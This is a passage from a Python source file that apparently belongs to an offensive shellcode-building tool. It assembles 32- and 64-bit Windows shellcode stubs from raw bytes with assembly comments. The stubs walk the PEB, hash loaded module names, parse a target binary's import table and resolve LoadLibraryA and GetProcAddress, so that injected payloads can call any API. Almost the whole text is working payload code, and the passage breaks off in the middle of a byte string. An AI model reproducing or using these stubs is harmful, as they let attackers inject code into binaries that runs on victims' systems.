        shellcode1 = bytes("\xfc"                   # cld
            "\x60"                                  # pushad
            "\x31\xd2"                              # xor edx,edx
            "\x64\x8b\x52\x30"                      # mov edx,[fs:edx+0x30]     ; PEB
            "\x8b\x52\x0c"                          # mov edx,[edx+0xc]         ; PEB_LDR_DATA 
            "\x8b\x52\x14"                          # mov edx,[edx+0x14]        ; ptr Flink Linked List in InMemoryOrderModuleList
            # next_mod
            "\x8b\x72\x28"                          # mov esi,[edx+0x28]        ; Points to UTF-16 module name in LDR_MODULE
            "\x6a\x18"                              # push byte +0x18           ; Set loop counter length
            "\x59"                                  # pop ecx                   ; Set loop counter length
            "\x31\xff"                              # xor edi,edi               ; clear edi to 0
            # loop_modnam
            "\x31\xc0"                              # xor eax,eax               ; clear eax to 0
            "\xac"                                  # lodsb                     ; load last to esi
            "\x3c\x61"                              # cmp al,0x61               ; check for capitalization
            "\x7c\x02"                              # jl 0x20                   ; if < 0x61 jump
            "\x2c\x20"                              # sub al,0x20               ; capitalize the letter
            # not_lowercase
            "\xc1\xcf\x0d"                          # ror edi,byte 0xd          ; rotate edi right 0xd bits
            "\x01\xc7"                              # add edi,eax               ; add sum to edi
            "\xe2\xf0"                              # loop 0x17                 ; continue until loop ends
            , "iso-8859-1")
        
        shellcode2 = b"\x81\xff"                    # cmp edi, DLL_HASH
        shellcode2 += struct.pack("<I", self.impts.DLL_INFO['hash'])                          
    
    
        shellcode3 = bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]        ; move module handle addr to ebx
            "\x8b\x12"                              # mov edx,[edx]             ; set edx base for next module interation
            "\x75\xdb"                              # jnz 0xf
            # iatparser         
            "\x89\xda"                              # mov edx,ebx               ; set as edx as image base
            "\x03\x52\x3c"                          # add edx,[edx+0x3c]        ; PE
            "\x8b\xba\x80\x00\x00\x00"              # mov edi,[edx+0x80]        ; Import Table RVA
            "\x01\xdf"                              # add edi,ebx
            # findImport
            "\x8b\x57\x0c"                          # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
            "\x03\xd3"                              # add edx, ebx                          ;Offset in memory
            , 'iso-8859-1')                            
        
        if self.impts.DLL_INFO['importname'] == 'kernelbase.dll': #it's actually in kernelbase
            shellcode3 += (
           b"\x81\x3a\x4b\x45\x52\x4e"               # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
           b"\x75\x09"                               # JE short 
           b"\x81\x7A\x04\x45\x4C\x42\x41"           # CMP DWORD PTR DS:[EDX+4],41424C45     ; elba
           b"\x74\x05"                               # je 0x102f                             ; jmp saveBase
           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
           b"\xeb\xe5"                               # jmp 0x101d                            ; Jmp findImport
           )

        else:
            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
            sys.exit(-1)

        shellcode3 += bytes(
            # saveBase
            "\x57"                                  # push edi
            "\xeb\x39"                              # jmp short 0x9f
            # setbounds         
            "\x8b\x57\x10"                          # mov edx,[edi+0x10]
            "\x01\xda"                              # add edx,ebx
            "\x8b\x37"                              # mov esi,[edi]
            "\x01\xde"                              # add esi,ebx
            "\x89\xd1"                              # mov ecx,edx   
            "\x81\xc1\x00\x00\xff\x00"              #  add ecx,0xff0000     
            "\x31\xed"                              #  xor ebp,ebp
            # findApi           
            "\x8b\x06"                              #  mov eax,[esi]
            "\x01\xd8"                              #  add eax,ebx
            "\x83\xc0\x02"                          #  add eax,byte +0x2
            "\x39\xc1"                              #  cmp ecx,eax
            "\x72\x13"                              #  jc 0x97
            "\x8b\x7c\x24\x04"                      #  mov edi,[esp+0x4]
            "\x39\x38"                              #  cmp [eax],edi
            "\x75\x0b"                              #  jnz 0x97
            "\x3e\x8b\x7c\x24\x08"                  #  mov edi,[ds:esp+0x8]
            "\x39\x78\x08"                          #  cmp [eax+0x8],edi
            "\x75\x01"                              #  jnz 0x97
            "\xc3"                                  #  ret
            # Increment         
            "\x83\xc5\x04"                          #  add ebp,byte +0x4
            "\x83\xc6\x04"                          #  add esi,byte +0x4
            "\xeb\xda"                              #  jmp short 0x77
            # loadApis
            "\x68\x64\x64\x72\x65"                  # push 0x65726464                       ;ddre
            "\x68\x47\x65\x74\x50"                  # push 0x50746547                       ;Getp
            "\xe8\xb8\xff\xff\xff"                  # call 0x1032        å                   ;call setBounds
            "\x03\xd5"                              # add edx, ebp                          ;
            "\x5d"                                  # pop ebp                               ;
            "\x5d"                                  # pop ebp                               ;
            "\x8b\xca"                              # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
            , 'iso-8859-1')
                    #GPA in ECX
        shellcode3 += b"\x89\xCD"                   # mov ebp, ecx GPA in EBP
        shellcode3 += bytes("\x31\xd2"              # xor    edx,edx
            "\x64\x8b\x52\x30"                      # mov    edx,DWORD PTR fs:[edx+0x30]
            "\x8b\x52\x0c"                          # mov    edx,DWORD PTR [edx+0xc]
            "\x8b\x52\x14"                          # mov    edx,DWORD PTR [edx+0x14]
            "\x8b\x72\x28"                          # mov    esi,DWORD PTR [edx+0x28]
            "\x6a\x18"                              # push   0x18
            "\x59"                                  # pop    ecx
            "\x31\xff"                              # xor    edi,edi
            "\x31\xc0"                              # xor    eax,eax
            "\xac"                                  # lods   al,BYTE PTR ds:[esi]
            "\x3c\x61"                              # cmp    al,0x61
            "\x7c\x02"                              # jl     0x20
            "\x2c\x20"                              # sub    al,0x20
            "\xc1\xcf\x0d"                          # ror    edi,0xd
            "\x01\xc7"                              # add    edi,eax
            "\xe2\xf0"                              # loop   0x17
            "\x81\xff\x5b\xbc\x4a\x6a"              # cmp    edi,0x6a4abc5b
            "\x8b\x5a\x10"                          # mov    ebx,DWORD PTR [edx+0x10]
            "\x8b\x12"                              # mov    edx,DWORD PTR [edx]
            "\x75\xdb"                              # jne    0xf
            , 'iso-8859-1')
    
        # kernel32.dll in ebx
        shellcode3 += bytes("\x6A\x00"              # push 0
            "\x68\x61\x72\x79\x41"                  # push LoadLibraryA\x00
            "\x68\x4c\x69\x62\x72"              
            "\x68\x4c\x6f\x61\x64"
            "\x8B\xcc"                              # mov ecx, esp
            "\x6A\x00"                              # push 0 ; for the getprocaddressforcaller prototype             
            "\x51"                                  # push ecx ; push ptr to loadlibrary on the stack
            #"\x54"                                 # push esp
            "\x53"                                  # push ebx (kernel32.dll handle)
            "\x89\xE9"                              # mov ecx,ebp getprocaddr
            "\xFF\x11"                              # call dword ptr [ecx]  # call dword ptr [ecx] 
            "\x50"                                  # push eax ; LLA in EAX
            "\x89\xe3"                              # mov ebx, esp ; mov ptr to LLA in ebx
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack

                       , 'iso-8859-1')
        # LOADLIBA in EBX
        # GETPROCADDR in EBP
    
        return shellcode1 + shellcode2 + shellcode3

    def OffsetGPA(self):
        self.parser_stub = 'GPA'
        self.importname = 'main_module'
        self.check_imports()

        shellcode = bytes( "\xfc"
               "\x60"                               # pushad
               "\x31\xd2"                           # xor edx, edx                          ;prep edx for use
               "\x64\x8b\x52\x30"                   # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
               "\x8b\x52\x08"                       # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
               "\x8b\xda"                           # mov ebx, edx                          ;Set ebx to imagebase
               "\xb9"                               # mov ecx, XXXX
                , 'iso-8859-1'
                )
                #mov ecx, imp_offset
                #add ecx, ebx 
        shellcode += struct.pack('<I', self.imp_offset)

               # GPA in ECX
        shellcode += bytes(
               "\x01\xD9"                           # add ecx, ebx
               "\x89\xCD" # mov ebp, ecx            # mov GPA to ebp
               "\x31\xd2"                           # xor    edx,edx
               "\x64\x8b\x52\x30"                   # mov    edx,DWORD PTR fs:[edx+0x30]
               "\x8b\x52\x0c"                       # mov    edx,DWORD PTR [edx+0xc]
               "\x8b\x52\x14"                       # mov    edx,DWORD PTR [edx+0x14]
               "\x8b\x72\x28"                       # mov    esi,DWORD PTR [edx+0x28]
               "\x6a\x18"                           # push   0x18
               "\x59"                               # pop    ecx
               "\x31\xff"                           # xor    edi,edi
               "\x31\xc0"                           # xor    eax,eax
               "\xac"                               # lods   al,BYTE PTR ds:[esi]
               "\x3c\x61"                           # cmp    al,0x61
               "\x7c\x02"                           # jl     0x20
               "\x2c\x20"                           # sub    al,0x20
               "\xc1\xcf\x0d"                       # ror    edi,0xd
               "\x01\xc7"                           # add    edi,eax
               "\xe2\xf0"                           # loop   0x17
               "\x81\xff\x5b\xbc\x4a\x6a"           # cmp    edi,0x6a4abc5b
               "\x8b\x5a\x10"                       # mov    ebx,DWORD PTR [edx+0x10]
               "\x8b\x12"                           # mov    edx,DWORD PTR [edx]
               "\x75\xdb"                           # jne    0xf
               # kernel32.dll in ebx
               "\x6A\x00"                           # push 0
               "\x68\x61\x72\x79\x41"               # push LoadLibraryA\x00
               "\x68\x4c\x69\x62\x72"           
               "\x68\x4c\x6f\x61\x64"           
               "\x54"                               # push esp
               "\x53"                               # push ebx (kernel32.dll handle)
               "\x89\xE9"                           # mov ecx,ebp getprocaddr
               "\xFF\x11"                           # call dword ptr [ecx]  # call dword ptr [ecx] 
               "\x50"                               # push eax ; LLA in EAX
               "\x89\xe3"                           # mov ebx, esp ; mov ptr to LLA in ebx
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               
               , 'iso-8859-1')
        return shellcode 

    def ExternOffsetGPA(self):
        self.parser_stub = 'GPA'
        self.importname = 'main_module'
        self.check_imports()

        shellcode = bytes("\xfc"                   # cld
            "\x60"                                  # pushad
            "\x31\xd2"                              # xor edx,edx
            "\x64\x8b\x52\x30"                      # mov edx,[fs:edx+0x30]     ; PEB
            "\x8b\x52\x0c"                          # mov edx,[edx+0xc]         ; PEB_LDR_DATA 
            "\x8b\x52\x14"                          # mov edx,[edx+0x14]        ; ptr Flink Linked List in InMemoryOrderModuleList
            # next_mod
            "\x8b\x72\x28"                          # mov esi,[edx+0x28]        ; Points to UTF-16 module name in LDR_MODULE
            "\x6a\x18"                              # push byte +0x18           ; Set loop counter length
            "\x59"                                  # pop ecx                   ; Set loop counter length
            "\x31\xff"                              # xor edi,edi               ; clear edi to 0
            # loop_modnam
            "\x31\xc0"                              # xor eax,eax               ; clear eax to 0
            "\xac"                                  # lodsb                     ; load last to esi
            "\x3c\x61"                              # cmp al,0x61               ; check for capitalization
            "\x7c\x02"                              # jl 0x20                   ; if < 0x61 jump
            "\x2c\x20"                              # sub al,0x20               ; capitalize the letter
            # not_lowercase
            "\xc1\xcf\x0d"                          # ror edi,byte 0xd          ; rotate edi right 0xd bits
            "\x01\xc7"                              # add edi,eax               ; add sum to edi
            "\xe2\xf0"                              # loop 0x17                 ; continue until loop ends
            , "iso-8859-1")
        
        shellcode += b"\x81\xff"                    # cmp edi, DLL_HASH
        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])                          
    
    
        shellcode += bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]        ; move module handle addr to ebx
            "\x8b\x12"                              # mov edx,[edx]             ; set edx base for next module interation
            "\x75\xdb"                              # jnz 0xf
            # iatparser         
            "\x89\xda"                              # mov edx,ebx               ; set as edx as image base
            "\xb9"                               # mov ecx, XXXX
                , 'iso-8859-1'
                )
                #mov ecx, imp_offset
                #add ecx, ebx 
        shellcode += struct.pack('<I', self.imp_offset)

               # GPA in ECX
        shellcode += bytes(
               "\x01\xD9"                           # add ecx, ebx
               "\x89\xCD" # mov ebp, ecx            # mov GPA to ebp
               "\x31\xd2"                           # xor    edx,edx
               "\x64\x8b\x52\x30"                   # mov    edx,DWORD PTR fs:[edx+0x30]
               "\x8b\x52\x0c"                       # mov    edx,DWORD PTR [edx+0xc]
               "\x8b\x52\x14"                       # mov    edx,DWORD PTR [edx+0x14]
               "\x8b\x72\x28"                       # mov    esi,DWORD PTR [edx+0x28]
               "\x6a\x18"                           # push   0x18
               "\x59"                               # pop    ecx
               "\x31\xff"                           # xor    edi,edi
               "\x31\xc0"                           # xor    eax,eax
               "\xac"                               # lods   al,BYTE PTR ds:[esi]
               "\x3c\x61"                           # cmp    al,0x61
               "\x7c\x02"                           # jl     0x20
               "\x2c\x20"                           # sub    al,0x20
               "\xc1\xcf\x0d"                       # ror    edi,0xd
               "\x01\xc7"                           # add    edi,eax
               "\xe2\xf0"                           # loop   0x17
               "\x81\xff\x5b\xbc\x4a\x6a"           # cmp    edi,0x6a4abc5b
               "\x8b\x5a\x10"                       # mov    ebx,DWORD PTR [edx+0x10]
               "\x8b\x12"                           # mov    edx,DWORD PTR [edx]
               "\x75\xdb"                           # jne    0xf
               # kernel32.dll in ebx
               "\x6A\x00"                           # push 0
               "\x68\x61\x72\x79\x41"               # push LoadLibraryA\x00
               "\x68\x4c\x69\x62\x72"           
               "\x68\x4c\x6f\x61\x64"           
               "\x54"                               # push esp
               "\x53"                               # push ebx (kernel32.dll handle)
               "\x89\xE9"                           # mov ecx,ebp getprocaddr
               "\xFF\x11"                           # call dword ptr [ecx]  # call dword ptr [ecx] 
               "\x50"                               # push eax ; LLA in EAX
               "\x89\xe3"                           # mov ebx, esp ; mov ptr to LLA in ebx
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               
               , 'iso-8859-1')
        return shellcode 

class stubs_64:

    def __init__(self, impts):
        self.impts = impts
        self.imp_offset = 0
    
    def check_imports(self):
        ####################################
        #### Parse imports via pefile ######

        #make this option only if a IAT based shellcode is selected
        pe = pefile.PE(self.impts.targetbinary, fast_load=True)
        sys.stderr.write("[*] Parsing data directories...\n")
        pe.parse_data_directories()
        
        try: 
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                for imp in entry.imports:
                    if imp.name is None:
                        continue
                    if imp.name.lower() == b'GetProcaddress'.lower():
                        self.imp_offset = imp.address - pe.OPTIONAL_HEADER.ImageBase
                        sys.stderr.write("[*] GPA offset: {0}\n".format(hex(self.imp_offset))) 
        
                    # Easter Egg?
                    #if imp.name.lower() == b'GetProcaddressforcaller'.lower():
                    #    self.imp_offset =  imp.address - pe.OPTIONAL_HEADER.ImageBase
                    #    sys.stderr.write("offset: {0}\n".format(hex(self.imp_offset))) 
        
        except Exception as e:
            sys.stderr.write("Exception: {0}\n".format(e))

    def lla_gpa_parser_stub(self):
        parser_stub = 'LLAGPA'
        importname = 'main_module'

        shellcode = bytes(
                "\xfc"                                              # cld 
                "\x52"                                              # push rdx
                "\x51"                                              # push rcx
                "\x57"                                              # push rdi
                "\x53"                                              # push rbx
                "\x56"                                              # push rsi
                "\x41\x50"                                          # push r8
                "\x41\x51"                                          # push r9
                "\x41\x54"                                          # push r12
                "\x41\x55"                                          # push r13
                "\x41\x56"                                          # push r14
                "\x41\x57"                                          # push r15
                "\x48\x31\xd2"                                      # xor rdx, rdx
                "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
                "\x48\x8b\x52\x10"                                  # mov rdx, qword ptr [rdx + 0x10]
                "\x49\x89\xd5"                                      # mov r13, rdx
                "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
                "\x48\x01\xc2"                                      # add rdx, rax
                "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
                "\x4c\x01\xef"                                      # add rdi, r13
                "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
                "\x4c\x01\xea"                                      # add rdx, r13
                "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
                "\x75\x09"                                          # jne 0x47
                "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
                "\x74\x06"                                          # je 0x4d
                "\x48\x83\xc7\x14"                                  # add rdi, 0x14
                "\xeb\xe3"                                          # jmp 0x30
                "\x57"                                              # push rdi
                "\xeb\x47"                                          # jmp 0x97
                "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
                "\x4c\x01\xea"                                      # add rdx, r13
                "\x8b\x37"                                          # mov esi, dword ptr [rdi]
                "\x4c\x01\xee"                                      # add rsi, r13
                "\x48\x89\xd1"                                      # mov rcx, rdx
                "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
                "\x4d\x31\xdb"                                      # xor r11, r11
                "\x8b\x06"                                          # mov eax, dword ptr [rsi]
                "\x4c\x01\xe8"                                      # add rax, r13
                "\x48\x83\xc0\x02"                                  # add rax, 2
                "\x48\x39\xc1"                                      # cmp rcx, rax
                "\x72\x17"                                          # jb 0x8d
                "\x48\x39\xd0"                                      # cmp rax, rdx
                "\x72\x12"                                          # jb 0x8d
                "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
                "\x39\x38"                                          # cmp dword ptr [rax], edi
                "\x75\x0a"                                          # jne 0x8d
                "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
                "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
                "\x75\x01"                                          # jne 0x8d
                "\xc3"                                              # ret 
                "\x41\x83\xc3\x04"                                  # add r11d, 4
                "\x48\x83\xc6\x04"                                  # add rsi, 4
                "\xeb\xd1"                                          # jmp 0x68
                "\x68\x61\x72\x79\x41"                              # push 0x41797261
                "\x68\x4c\x6f\x61\x64"                              # push 0x64616f4c
                "\xe8\xaa\xff\xff\xff"                              # call 0x50
                "\x4c\x01\xda"                                      # add rdx, r11
                "\x48\x83\xc4\x10"                                  # add rsp, 0x10
                "\x5f"                                              # pop rdi
                "\x52"                                              # push rdx
                "\x68\x64\x64\x72\x65"                              # push 0x65726464
                "\x68\x47\x65\x74\x50"                              # push 0x50746547
                "\xe8\x92\xff\xff\xff"                              # call 0x50
                "\x4c\x01\xda"                                      # add rdx, r11
                "\x59"                                              # pop rcx
                "\x59"                                              # pop rcx
                "\x41\x5e"                                          # pop r14
                "\x49\x89\xd7"                                      # mov r15, rdx

                # LLA in r14
                # GPA in r15
                , 'iso-8859-1')

        return shellcode

    def gpa_parser_stub(self):
        parser_stub = 'GPA'
        importname = 'main_module'

        shellcode = bytes(
            "\xfc"                                              # cld 
            "\x52"                                              # push rdx
            "\x51"                                              # push rcx
            "\x57"                                              # push rdi
            "\x53"                                              # push rbx
            "\x56"                                              # push rsi
            "\x41\x50"                                          # push r8
            "\x41\x51"                                          # push r9
            "\x41\x54"                                          # push r12
            "\x41\x55"                                          # push r13
            "\x41\x56"                                          # push r14
            "\x41\x57"                                          # push r15
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x10"                                  # mov rdx, qword ptr [rdx + 0x10]
            "\x49\x89\xd5"                                      # mov r13, rdx
            "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
            "\x48\x01\xc2"                                      # add rdx, rax
            "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
            "\x4c\x01\xef"                                      # add rdi, r13
            "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
            "\x4c\x01\xea"                                      # add rdx, r13
            "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
            "\x75\x09"                                          # jne 0x48
            "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
            "\x74\x06"                                          # je 0x4e
            "\x48\x83\xc7\x14"                                  # add rdi, 0x14
            "\xeb\xe3"                                          # jmp 0x31
            "\x57"                                              # push rdi
            "\xeb\x47"                                          # jmp 0x98
            "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
            "\x4c\x01\xea"                                      # add rdx, r13
            "\x8b\x37"                                          # mov esi, dword ptr [rdi]
            "\x4c\x01\xee"                                      # add rsi, r13
            "\x48\x89\xd1"                                      # mov rcx, rdx
            "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
            "\x4d\x31\xdb"                                      # xor r11, r11
            "\x8b\x06"                                          # mov eax, dword ptr [rsi]
            "\x4c\x01\xe8"                                      # add rax, r13
            "\x48\x83\xc0\x02"                                  # add rax, 2
            "\x48\x39\xc1"                                      # cmp rcx, rax
            "\x72\x17"                                          # jb 0x8e
            "\x48\x39\xd0"                                      # cmp rax, rdx
            "\x72\x12"                                          # jb 0x8e
            "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
            "\x39\x38"                                          # cmp dword ptr [rax], edi
            "\x75\x0a"                                          # jne 0x8e
            "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
            "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
            "\x75\x01"                                          # jne 0x8e
            "\xc3"                                              # ret 
            "\x41\x83\xc3\x04"                                  # add r11d, 4
            "\x48\x83\xc6\x04"                                  # add rsi, 4
            "\xeb\xd1"                                          # jmp 0x69
            "\x68\x64\x64\x72\x65"                              # push 0x65726464
            "\x68\x47\x65\x74\x50"                              # push 0x50746547
            "\xe8\xaa\xff\xff\xff"                              # call 0x51
            "\x4c\x01\xda"                                      # add rdx, r11
            "\x59"                                              # pop rcx
            "\x59"                                              # pop rcx
            "\x49\x89\xd7"                                      # mov r15, rdx
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
            "\x6a\x18"                                          # push 0x18
            "\x59"                                              # pop rcx
            "\x4d\x31\xc9"                                      # xor r9, r9
            "\x48\x31\xc0"                                      # xor rax, rax
            "\xac"                                              # lodsb al, byte ptr [rsi]
            "\x3c\x61"                                          # cmp al, 0x61
            "\x7c\x02"                                          # jl 0xd3
            "\x2c\x20"                                          # sub al, 0x20
            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
            "\x41\x01\xc1"                                      # add r9d, eax
            "\xe2\xed"                                          # loop 0xc9
            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
            "\x48\x8b\x5a\x20"                                  # mov rbx, qword ptr [rdx + 0x20]
            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
            "\x75\xd3"                                          # jne 0xbf
            "\x6a\x00"                                          # push 0
            "\x6a\x00"                                          # push 0
            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
            "\x48\x89\xe2"                                      # mov rdx, rsp
            "\x48\x89\xd9"                                      # mov rcx, rbx
            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
            "\x4d\x89\xd5"                                      # mov r13, r10
            "\x41\xff\x17"                                      # call qword ptr [r15]
            "\x50"                                              # push rax
            "\x49\x89\xe6"                                      # mov r14, rsp
            "\x4d\x89\xea"                                      # mov r10, r13
            "\x48\x83\xc4\x40"                                  # add rsp, 0x40
            , 'iso-8859-1')

        return shellcode

    def loaded_lla_gpa_parser_stub(self):
        self.parser_stub = 'ExternLLAGPA'
        
        shellcode = bytes(
                    "\xfc"                                              # cld 
                    "\x52"                                              # push rdx
                    "\x51"                                              # push rcx
                    "\x57"                                              # push rdi
                    "\x53"                                              # push rbx
                    "\x56"                                              # push rsi
                    "\x41\x50"                                          # push r8
                    "\x41\x51"                                          # push r9
                    "\x41\x54"                                          # push r12
                    "\x41\x55"                                          # push r13
                    "\x41\x56"                                          # push r14
                    "\x41\x57"                                          # push r15
                    "\x48\x31\xd2"                                      # xor rdx, rdx
                    "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
                    "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
                    "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
                    "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
                    "\x6a\x18"                                          # push 0x18
                    "\x59"                                              # pop rcx
                    "\x4d\x31\xc9"                                      # xor r9, r9
                    "\x48\x31\xc0"                                      # xor rax, rax
                    "\xac"                                              # lodsb al, byte ptr [rsi]
                    "\x3c\x61"                                          # cmp al, 0x61
                    "\x7c\x02"                                          # jl 0x37
                    "\x2c\x20"                                          # sub al, 0x20
                    "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
                    "\x41\x01\xc1"                                      # add r9d, eax
                    "\xe2\xed"                                          # loop 0x2d
                    , 'iso-8859-1'
                    )
        shellcode += b"\x41\x81\xf9"                                    # cmp r9d, 0xXXXXXXXX
        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])    # DLL_HASH
        
        shellcode += bytes("\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
                    "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
                    "\x75\xd3"                                          # jne 0x23
                    "\x4c\x89\xea"                                      # mov rdx, r13
                    "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
                    "\x48\x01\xc2"                                      # add rdx, rax
                    "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
                    "\x4c\x01\xef"                                      # add rdi, r13
                    "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
                    "\x4c\x01\xea"                                      # add rdx, r13
                    , 'iso-8859-1'
                    )
        if self.impts.DLL_INFO['importname'] == 'kernel32.dll':
            shellcode += bytes(
                    "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
                    "\x75\x09"                                          # jne 0x79
                    "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
                    "\x74\x06"                                          # je 0x7f
                    "\x48\x83\xc7\x14"                                  # add rdi, 0x14
                    "\xeb\xe3"                                          # jmp 0x62
                    , 'iso-8859-1')
        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
            shellcode += bytes(
                    
                    "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
                    "\x75\x09"                                          # jne 0x79
                    "\x81\x7A\x22\x2d\x30\x2e\x64"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp -0.d
                    "\x74\x06"                                          # je 0x7f
                    "\x48\x83\xc7\x14"                                  # add rdi, 0x14
                    "\xeb\xe2"                                          # jmp 0x62
                    , 'iso-8859-1'
                    )
        else:
            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
            sys.exit(-1)
        
        shellcode += bytes(
                    "\x57"                                              # push rdi
                    "\xeb\x47"                                          # jmp 0xc9
                    "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
                    "\x4c\x01\xea"                                      # add rdx, r13
                    "\x8b\x37"                                          # mov esi, dword ptr [rdi]
                    "\x4c\x01\xee"                                      # add rsi, r13
                    "\x48\x89\xd1"                                      # mov rcx, rdx
                    "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
                    "\x4d\x31\xdb"                                      # xor r11, r11
                    "\x8b\x06"                                          # mov eax, dword ptr [rsi]
                    "\x4c\x01\xe8"                                      # add rax, r13
                    "\x48\x83\xc0\x02"                                  # add rax, 2
                    "\x48\x39\xc1"                                      # cmp rcx, rax
                    "\x72\x17"                                          # jb 0xbf
                    "\x48\x39\xd0"                                      # cmp rax, rdx
                    "\x72\x12"                                          # jb 0xbf
                    "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
                    "\x39\x38"                                          # cmp dword ptr [rax], edi
                    "\x75\x0a"                                          # jne 0xbf
                    "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
                    "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
                    "\x75\x01"                                          # jne 0xbf
                    "\xc3"                                              # ret 
                    "\x41\x83\xc3\x04"                                  # add r11d, 4
                    "\x48\x83\xc6\x04"                                  # add rsi, 4
                    "\xeb\xd1"                                          # jmp 0x9a
                    , 'iso-8859-1'
                    )
                    #"\x68\x61\x72\x79\x41"                              # push 0x41797261
        if self.impts.DLL_INFO['importname'].lower() == 'kernel32.dll':
            shellcode += b"\x68\x61\x72\x79\x41"                 # push dword 0x41797261 ; raryA
        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
            shellcode += b"\x68\x61\x72\x79\x45"
        else:
            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
            sys.exit(-1)

        shellcode +=  bytes(
                    "\x68\x4c\x6f\x61\x64"                              # push 0x64616f4c
                    "\xe8\xaa\xff\xff\xff"                              # call 0x82
                    "\x4c\x01\xda"                                      # add rdx, r11
                    "\x48\x83\xc4\x10"                                  # add rsp, 0x10
                    "\x5f"                                              # pop rdi
                    "\x52"                                              # push rdx
                    "\x68\x64\x64\x72\x65"                              # push 0x65726464
